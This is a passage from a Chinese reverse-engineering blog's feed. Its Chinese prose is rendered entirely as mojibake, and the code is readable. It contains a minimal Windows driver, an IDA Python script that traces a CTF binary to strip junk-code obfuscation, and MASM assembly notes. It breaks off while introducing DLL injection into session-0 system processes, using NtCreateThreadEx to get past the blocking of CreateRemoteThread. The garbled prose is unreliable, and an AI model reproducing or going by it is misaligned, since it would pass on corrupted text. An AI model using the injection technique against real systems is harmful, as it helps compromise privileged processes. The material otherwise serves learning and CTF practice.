æ³•çœ‹åˆ°å¯¹åº”çš„é©±åŠ¨</h3><p>æŸ¥çœ‹å½“å‰é©±åŠ¨æ˜¯ä¸æ˜¯ç¡¬ä»¶é©±åŠ¨ï¼Œåœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­é€‰æ‹©æŒ‰é©±åŠ¨åˆ†ç±»ï¼Œå¯ä»¥æ‰¾åˆ°è‡ªå·±å®‰è£…çš„é©±åŠ¨ï¼Œæƒ³è¦çœ‹è¿™ç§é©±åŠ¨çš„å€¼ï¼Œå¯ä»¥é€šè¿‡é©±åŠ¨æ³¨å…¥ç¨‹åºå¼ºåˆ¶å®‰è£…ï¼Œç„¶ååœ¨dbgviewä¸­çœ‹åˆ°æ•ˆæœã€‚å¦‚æœæ˜¯å¾®è½¯å†™çš„æŠ½è±¡helloworldä»£ç ï¼Œå› ä¸ºæ²¡å†™å¸è½½å‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½å¸è½½ã€‚ä¸å¦‚ç”¨ä¸‹é¢è¿™ä¸ªåšæµ‹è¯•(ç”¨wdmé¡¹ç›®)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pdriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;DriverUnload\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject,</span></span><br><span class="line"><span class="params">PUNICODE_STRING pRegPath<span class="comment">//æ³¨å†Œè¡¨è·¯å¾„</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;DriverEntry\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pDriverObject-&gt;DriverUnload = DriverUnload;<span class="comment">//æŒ‡å®šé©±åŠ¨å¸è½½å‡½æ•°</span></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤ªæŠ½è±¡äº†ï¼Œè¿™ä¸ªç¯å¢ƒé…äº†6å¤©TATï¼Œæ„Ÿè°¢ <span class='nota' data-nota='å¡å¯†'>å­¦é•¿</span> å¸®æˆ‘ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å®è·µ </category>
          
          <category> è®°å½• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IDAè‡ªåŠ¨åŒ–è°ƒè¯•</title>
      <link href="/posts/9be53c83.html"/>
      <url>/posts/9be53c83.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>ä¹‹å‰ä¸€ç›´æƒ³æ‰¾ä¸ªæ–¹æ³•å®ç°IDAè°ƒè¯•çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œæ“ä½œï¼Œç°åœ¨ç»ˆäºæ‰¾åˆ°äº†</p><p>idaé‡Œé¢æœ‰ä¸€ä¸ªapiï¼šida_dbg.step_into()ï¼Œæ•ˆæœæ˜¯æ‰§è¡Œä¸€æ¬¡æ­¥å…¥ï¼Œé€šè¿‡å¾ªç¯è¿™ä¸ªæŒ‡ä»¤å°±å¯ä»¥å®ç°è‡ªåŠ¨æ­¥å…¥çš„æ•ˆæœï¼Œåœ¨æ­¥è¿‡åå†™è‡ªå·±éœ€è¦çš„æ•ˆæœå°±å¥½</p><h2 id="å®ç°">å®ç°</h2><p>ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹äºdasctfï¼ŒBabyEncçš„æŒ‡ä»¤è¿˜åŸè„šæœ¬ï¼Œè¿™ä¸ªé¢˜å°†çœŸçš„é€»è¾‘ç”¨æ±‡ç¼–å†™äº†å‡ºæ¥ï¼Œå¹¶æŠŠæ¯å¥æ±‡ç¼–æ”¾åœ¨æ ¼å¼ç›¸åŒçš„èŠ±æŒ‡ä»¤ä¸­ï¼Œé€šè¿‡ä¸‹é¢è¿™ä¸ªè„šæœ¬å¯ä»¥æå–æ¯ç»„æ±‡ç¼–ä¸­çš„çœŸå®ä»£ç ï¼Œç»„åˆæˆä¸€ä¸ªå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> ida_dbg</span><br><span class="line"></span><br><span class="line">statx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_address</span>(<span class="params">target_ea</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;trace_output.bin&quot;</span>, <span class="string">&quot;ab&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ida_dbg.wait_for_next_event(ida_dbg.WFNE_SUSP, -<span class="number">1</span>)<span class="comment">#åœ¨è·å–å†…å­˜/å¯„å­˜å™¨/çŠ¶æ€å’Œæ‰§è¡Œ(f4,f7,f8,f9)ä¹‹é—´å¿…é¡»æœ‰è¿™è¡Œï¼Œidaæ˜¯å•çº¿ç¨‹ï¼Œå¿…é¡»ç­‰å¾…è°ƒè¯•å™¨è·å–åˆ°çŠ¶æ€ä¹‹åå†å–å†…å®¹</span></span><br><span class="line">            current_ea = ida_dbg.get_reg_val(<span class="string">&quot;EIP&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> current_ea == target_ea:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;finished&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                handle_instruction(current_ea, f)</span><br><span class="line">                ida_dbg.step_into()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_instruction</span>(<span class="params">ea, file</span>):</span><br><span class="line">    <span class="keyword">global</span> statx</span><br><span class="line">    statx-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(statx &lt;= <span class="number">0</span>):<span class="comment">#å‡å°‘æ—¶é—´ï¼ŒidaæŒ‡ä»¤éœ€è¦æ—¶é—´</span></span><br><span class="line">        instr = idc.GetDisasm(ea)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;jmp     ebx&quot;</span> <span class="keyword">in</span> instr:<span class="comment">#åœ¨æ¯å—çš„ç»“å°¾æ‰§è¡Œ</span></span><br><span class="line">            statx = <span class="number">11</span></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            ea_temp = ea</span><br><span class="line">            prev_instr = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> count &lt; <span class="number">11</span>:<span class="comment">#å‘ä¸Šæ‰¾ç¬¬åä¸€è¡Œä»£ç </span></span><br><span class="line">                ea_temp = idc.prev_head(ea_temp)</span><br><span class="line">                prev_instr = idc.GetDisasm(ea_temp)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;popa&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> prev_instr <span class="keyword">and</span> <span class="string">&quot;cmp&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> prev_instr:<span class="comment">#è¿‡æ»¤è·³è½¬æŒ‡ä»¤</span></span><br><span class="line">                machine_code = ida_bytes.get_bytes(ea_temp, idc.get_item_size(ea_temp))</span><br><span class="line">                file.write(machine_code)</span><br><span class="line">                <span class="built_in">print</span>(prev_instr)</span><br><span class="line"></span><br><span class="line">check_address(<span class="number">0x0041F082</span>)</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§å®ç°æ˜¯ä¾èµ–æ–­ç‚¹çš„å®ç°ï¼Œç»§æ‰¿DBG_hookså®ç°æ–­ç‚¹é’©å­ï¼Œéœ€è¦å‡†ç¡®çŸ¥é“åœ¨å“ªé‡Œä¸‹æ–­ç‚¹æ‰è¡Œï¼Œæ„Ÿè§‰æœ‰ç‚¹éº»çƒ¦ï¼Œä¸è¿‡è¦æ˜¯èƒ½ç®—å‡ºæ¥å…·ä½“çš„ä½ç½®ï¼Œé‚£ä¹Ÿå¾ˆç®€å•ï¼Œé€Ÿåº¦ä¹Ÿæ›´å¿«</p><h2 id="ç¼ºç‚¹">ç¼ºç‚¹</h2><p>éœ€è¦çš„æ—¶é—´å¤ªé•¿äº†ï¼Œå°¤å…¶æ˜¯åœ¨æœ‰é•¿èŠ±æŒ‡ä»¤çš„æƒ…å†µä¸‹ï¼Œè¿™æ®µä»£ç å¤§æ¦‚æ‰§è¡Œäº†90åˆ†é’Ÿå·¦å³ï¼Œä½†æ˜¯æ²¡æœ‰èŠ±æŒ‡ä»¤ä¸€èˆ¬å¥½åƒä¹Ÿä¸éœ€è¦è¿™ç§æ“ä½œ(ä¹Ÿè®¸æ§åˆ¶æµæ··æ·†éœ€è¦ï¼Ÿ)ã€‚ä¸è¿‡å¦å¤–ä¸€æ–¹é¢ï¼Œç¼–å†™è¿™ç§è„šæœ¬ä¸éœ€è¦è„‘å­ï¼Œä¸éœ€è¦ä¸»åŠ¨è·å–å¯„å­˜å™¨çš„å€¼ï¼Œæ¨¡æ‹Ÿæ‰§è¡Œå¯èƒ½å†™çš„æœ‰åå·®ï¼Œä½†æ˜¯è¿™ç§å°±è‚¯å®šä¸ä¼šé”™ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> è‡ªåŠ¨åŒ–é€†å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MASMæ±‡ç¼–</title>
      <link href="/posts/dfd755e7.html"/>
      <url>/posts/dfd755e7.html</url>
      
        <content type="html"><![CDATA[<h2 id="x16åŸºæœ¬æ ¼å¼">x16åŸºæœ¬æ ¼å¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment;æŒ‡å®šæ®µ</span><br><span class="line"></span><br><span class="line">int 21h;é€€å‡º</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="x86åŸºæœ¬æ ¼å¼">x86åŸºæœ¬æ ¼å¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">.586;æŒ‡å®šæŒ‡ä»¤é›†ç‰ˆæœ¬</span><br><span class="line">.model flat,stdcall;è®¾ç½®å†…å­˜æ¨¡å‹å’Œè°ƒç”¨çº¦å®š:_edecl,_stdcall,_fastcallï¼Œ_thiscall</span><br><span class="line">option casemap:none;åŒºåˆ†å¤§å°å†™</span><br><span class="line"></span><br><span class="line">includelib ucrt.lib;å¯¼å…¥cç›¸å…³æ ‡å‡†åº“</span><br><span class="line">includelib legacy_stdio_definitions.lib;å¯¼å…¥cç›¸å…³åº“</span><br><span class="line"></span><br><span class="line">includelib Kernel32.lib</span><br><span class="line">includelib User32.lib</span><br><span class="line"></span><br><span class="line">MessageBoxA proto hwnd:DWORD,lpText:BYTE,lpCaption:BYTE,uType:DWORD</span><br><span class="line">ExitProcess proto uCode:DWORD</span><br><span class="line"></span><br><span class="line">extern printf:proc;å£°æ˜å¤–éƒ¨å‡½æ•°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data;æŒ‡å®šæ®µ</span><br><span class="line">szFormat db &#x27;%d&#x27;, 0</span><br><span class="line"></span><br><span class="line">.code;æŒ‡å®šæ®µ</span><br><span class="line">main proc</span><br><span class="line">mov eax,64h</span><br><span class="line">push eax;å‡½æ•°è°ƒç”¨</span><br><span class="line">lea ecx,szFormat</span><br><span class="line">push ecx</span><br><span class="line">call printf</span><br><span class="line">add esp,8;cæ ‡å‡†</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">call MessageBoxA;</span><br><span class="line">push 0</span><br><span class="line">call ExitProcess;winæ ‡å‡† æˆ–è€…å¯ä»¥å†™invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="æ±‡ç¼–å¤´æ–‡ä»¶-inc">æ±‡ç¼–å¤´æ–‡ä»¶(.inc)</h3><p>åŒ…å«å¤´æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include header.inc</span><br></pre></td></tr></table></figure><h3 id="ä¼ªæŒ‡ä»¤">ä¼ªæŒ‡ä»¤</h3><h4 id="invoke">invoke</h4><p>ä½¿ç”¨å‰å¿…é¡»å…ˆå®šä¹‰ï¼Œæ¯”å¦‚ä¸Šé¢çš„<code>ExitProcess proto uCode:DWORD</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke farproc,para1,para2,...</span><br></pre></td></tr></table></figure><p>åªèƒ½ç”¨äºwin32 api</p><p><a href="https://masm32.com/download.htm">Download The MASM32 SDK</a>ä¸‹è½½MASM32SDK</p><p>æ•ˆæœæ˜¯å¯ä»¥ç›´æ¥å¯¼å…¥å·²ç»å®šä¹‰å¥½çš„å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥invoke</p><p>åœ¨é¡¹ç›®å±æ€§ä¸­Microsoft Macro Assembler-include Pathsä¸­é™„åŠ MASMä¸­çš„includeç›®å½•ï¼Œç„¶åå¯ä»¥ç›´æ¥è¿™æ ·ä½¿ç”¨å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.586;æŒ‡å®šæŒ‡ä»¤é›†ç‰ˆæœ¬</span><br><span class="line">.model flat,stdcall;è®¾ç½®å†…å­˜æ¨¡å‹å’Œè°ƒç”¨çº¦å®š:_edecl,_stdcall,_fastcallï¼Œ_thiscall</span><br><span class="line">option casemap:none;åŒºåˆ†å¤§å°å†™</span><br><span class="line"></span><br><span class="line">includelib ucrt.lib;å¯¼å…¥cç›¸å…³æ ‡å‡†åº“</span><br><span class="line">includelib legacy_stdio_definitions.lib;å¯¼å…¥cç›¸å…³åº“</span><br><span class="line"></span><br><span class="line">include Kernel32.inc</span><br><span class="line">include User32.inc</span><br><span class="line"></span><br><span class="line">includelib Kernel32.lib</span><br><span class="line">includelib User32.lib</span><br><span class="line"></span><br><span class="line">extern printf:proc;å£°æ˜å¤–éƒ¨å‡½æ•°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data;æŒ‡å®šæ®µ</span><br><span class="line">szFormat db &#x27;%d&#x27;, 0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">mov eax,64h</span><br><span class="line">push eax;å‡½æ•°è°ƒç”¨</span><br><span class="line">lea ecx,szFormat</span><br><span class="line">push ecx</span><br><span class="line">call printf</span><br><span class="line">add esp,8;cæ ‡å‡†</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">call MessageBoxA;</span><br><span class="line">push 0</span><br><span class="line">call ExitProcess;winæ ‡å‡† æˆ–è€…å¯ä»¥å†™invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>å¯¹äºè‡ªå·±å®šä¹‰çš„å‡½æ•°ï¼Œä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addx proc numA:dword,numB:dword</span><br><span class="line">xor eax,eax</span><br><span class="line">add eax,numA</span><br><span class="line">add eax,numB</span><br><span class="line">ret</span><br><span class="line">addx endp</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„æ ¼å¼ï¼Œä¹Ÿå¯ä»¥ç”¨invokeè°ƒç”¨ï¼Œå¯¹äºCåº“çš„cstdå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹å¼è¿›è¡Œä¸€æ¬¡stdçš„å°è£…ã€‚</p><h4 id="if">if</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">main proc</span><br><span class="line">mov dwIndex,11</span><br><span class="line">    .if dwIndex== 10</span><br><span class="line">    mov dwNumber,10</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .elseif deIndex &gt;= 12</span><br><span class="line">    mov dwNumber,12</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .else</span><br><span class="line">    mov dwNumber,0</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .endif</span><br><span class="line">main endp</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">.break;è·³å‡ºå¾ªç¯</span><br><span class="line">.continue;è·³åˆ°æ¡ä»¶æ£€æŸ¥</span><br></pre></td></tr></table></figure><h4 id="while">while</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dwIndex,100</span><br><span class="line">.while dwIndex&gt;0</span><br><span class="line">dec deIndex</span><br><span class="line">.endw</span><br></pre></td></tr></table></figure><h3 id="å®">å®</h3><p>æ— å‚å®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAA EQU 100</span><br></pre></td></tr></table></figure><p>å°†AAAå½“100</p><p>æœ‰å‚å®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;å®šä¹‰</span><br><span class="line">MyAdd MACRO n1</span><br><span class="line">add eax,n1</span><br><span class="line">endm</span><br><span class="line">;ä½¿ç”¨</span><br><span class="line">MyAdd &lt;1&gt;;ç®€å•å‚æ•°ä¹Ÿå¯ä»¥ç›´æ¥MyAdd 1</span><br><span class="line"></span><br><span class="line">MyAdd2 MACRO reg,n1</span><br><span class="line">add reg,n1</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">MyAdd eax,10</span><br></pre></td></tr></table></figure><h3 id="ç»“æ„ä½“">ç»“æ„ä½“</h3><p>åœ¨dataæ®µå¤–å£°æ˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Point struct;å£°æ˜</span><br><span class="line">x word ?</span><br><span class="line">y word ?</span><br><span class="line">Point ends</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">MyPoint Point&lt;?&gt;;ä¸åˆå§‹åŒ–å®šä¹‰</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">    mov MyPoint.x,123</span><br><span class="line">    mov MyPoint.y,456</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="å†…è”æ±‡ç¼–">å†…è”æ±‡ç¼–</h3><p>vsä¸­å¯ä»¥åœ¨cå’Œcppä¸­ä½¿ç”¨å†…è”æ±‡ç¼–</p><p>x86ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_asm&#123;</span><br><span class="line">push MB_OK;å¯ä»¥ç›´æ¥ä¼ å®</span><br><span class="line">call myFunc;å¯ä»¥ç›´æ¥è°ƒç”¨å®šä¹‰çš„å‡½æ•°</span><br><span class="line">_emit 1;ç«‹å³æ•°</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x64ï¼š</p><p>åœ¨ç”Ÿæˆä¾èµ–é¡¹ä¸­å‹¾é€‰masmï¼Œæ–°å»ºasmæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">Myadd proc</span><br><span class="line">mov ecx,edx</span><br><span class="line">mov eax,ecx</span><br><span class="line">ret</span><br><span class="line">Myadd endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>å†å£°æ˜head.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exten <span class="string">&quot;C&quot;</span> DWORD <span class="title function_">Myadd</span><span class="params">(DWORD a,DWORD b)</span>;</span><br></pre></td></tr></table></figure><p>åŒ…å«è¿™ä¸ªæ–‡ä»¶å³å¯ç›´æ¥ä½¿ç”¨</p><h2 id="x64åŸºæœ¬æ ¼å¼">x64åŸºæœ¬æ ¼å¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">sub rsp,28h</span><br><span class="line">add rsp,28h</span><br><span class="line">ret</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥å†™ä»£ç ï¼Œè°ƒç”¨å‡½æ•°ç”¨fastcall</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">.data?;å®šä¹‰æœªåˆå§‹åŒ–æ•°æ®</span><br><span class="line">.const;å®šä¹‰å¸¸é‡</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¿®æ”¹ç¼–è¯‘å™¨ä¸ºinterï¼Œå¯ä»¥ç»§ç»­ä½¿ç”¨å†…è”æ±‡ç¼–</p><p>å¯ä»¥ç›´æ¥ä½¿ç”¨vsæˆ–è€…idaæŸ¥çœ‹c/cppä»£ç ç„¶åå–å¾—ç›¸åº”çš„æ±‡ç¼–ä»£ç ï¼Œé¿å…éº»çƒ¦<br>VSä¸­éœ€è¦å…ˆå–æ¶ˆç¬¦å·</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ±‡ç¼– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹0C-å‘ä¼šè¯0æ³¨å…¥DLL</title>
      <link href="/posts/9dacfd2d.html"/>
      <url>/posts/9dacfd2d.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¼šè¯">ä¼šè¯</h2><p>ä¼šè¯æ˜¯ç™»å½•åçš„ç”¨æˆ·ç¯å¢ƒ</p><p>åœ¨è¿›ç¨‹ç®¡ç†å™¨ä¸­è¯¦ç»†ä¿¡æ¯çš„ç©ºæ ä¸­å³é”®ï¼Œå¯ä»¥æ‰“å¼€ä¼šè¯å±æ€§ï¼š</p><p><img src="https://s2.loli.net/2025/02/27/NUsmc2Vodyr4CLP.png" alt="image-20250227180553270"></p><p>å®ƒç”¨æ¥éš”ç¦»ä¸åŒç”¨æˆ·çš„æ“ä½œç¯å¢ƒï¼Œä¼šè¯IDçš„å…ˆåé¡ºåºå–å†³äºç³»ç»Ÿå¯åŠ¨åå“ªä¸ªç”¨æˆ·å…ˆç™»å½•ï¼Œä¼šè¯0ä¸€èˆ¬ä¸ºç³»ç»Ÿè¿›ç¨‹ï¼Œå’Œç”¨æˆ·è¿›ç¨‹éš”ç¦»æ¥æé«˜å®‰å…¨æ€§ã€‚ï¼ˆä½†æ˜¯çœ‹èµ·æ¥ä¼¼ä¹æ²¡ä»€ä¹ˆç”¨ï¼‰</p><p>å¦‚æœè¦æ³¨å…¥ç³»ç»Ÿè¿›ç¨‹ï¼Œç›´æ¥ä½¿ç”¨CreateRemoteThreadä¼šè¢«æ‹¦æˆªä¸‹æ¥ï¼Œæ‰€ä»¥éœ€è¦ç”¨å¦å¤–çš„åŠæ³•ã€‚æœ€ç®€å•çš„å°±æ˜¯æ¢ä¸€ä¸ªAPIï¼šNtCreateThreadEx</p><p>å®šä¹‰å¦‚ä¸‹ï¼Œä¸CreateRemoteThreadå·®ä¸å¤š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* PFNTCREATETHREADEX)</span><span 